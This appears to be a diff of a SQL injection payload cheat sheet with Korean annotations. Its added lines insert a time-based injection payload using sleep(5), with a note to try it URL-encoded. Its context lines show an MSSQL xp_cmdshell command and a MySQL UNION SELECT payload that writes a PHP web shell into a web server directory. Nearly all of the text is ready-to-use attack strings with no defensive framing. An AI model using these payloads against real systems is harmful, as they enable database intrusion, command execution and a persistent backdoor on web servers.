@@ -69,6 +69,10 @@ EXECUTE xp_cmdshell 'whoami';
 
 
 # 🐬 MySQL Code Execution
+```sql
+' UNION SELECT sleep(5);-- -
+```
+→ URL ENCODED로 실행해보기
 
 ```sql
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
